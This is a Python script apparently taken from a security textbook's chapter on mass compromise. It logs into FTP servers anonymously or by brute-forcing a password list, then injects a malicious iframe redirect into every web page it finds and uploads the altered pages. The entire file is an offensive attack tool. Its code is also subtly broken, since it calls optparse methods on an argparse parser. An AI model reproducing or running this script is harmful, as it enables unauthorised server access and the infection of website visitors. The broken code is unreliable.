''' mass compromise for chapter 2 of Violent Python'''
import ftplib
import argparse
import time
import sys


def anonLogin(ip):
    ''' anonymous login'''
    try:
        ftp = ftplib.FTP(ip)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(ip) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(ip) + ' FTP Anonymous Logon Failed.')
        print('[-] Exception: ' + str(e))
        return False


def bruteLogin(ip, passwdFile):
    ''' brute login'''
    try:
        pF = open(passwdFile,  # pylint: disable=R1732
                  'r',
                  encoding='utf-8-sig')
    except Exception as e:
        print('[-] File Not Found: ' + str(e))
        return None
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(ip) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    ''' return the default pages for the chapter 2'''
    try:
        dirList = ftp.nlst()
    except Exception as e:
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        print('[-] Exception: ' + str(e))
        return None
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    ''' inject the redirect page'''
    f = open(page + '.tmp',  # pylint: disable=R1732
             'w',
             encoding='utf-8-sig')
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp',  # pylint: disable=R1732
                                       'r',
                                       encoding='utf-8-sig'))
    print('[+] Uploaded Injected Page: ' + page)


def attack(username, password, tgtHost, redirect):
    ''' attack the ftp'''
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    ''' main function'''
    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', type='string', help='specify target host')
    parser.add_option('-f', type='string', help='specify user/password file')
    parser.add_option('-r', type='string', help='specify a redirection page')
    args = parser.parse_args()
    tgtHosts = str(args.H).split(', ')
    passwdFile = str(args.f)
    redirect = str(args.r)
    if tgtHosts is None or redirect is None:
        print(parser.usage)
        sys.exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) is True:
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
        elif passwdFile is not None:
            (username, password) = bruteLogin(tgtHost, passwdFile)
        if password is not None:
            print('[+] Using Creds: ' + username + '/' + password + ' to attack')
            attack(username, password, tgtHost, redirect)


if __name__ == '__main__':
    main()
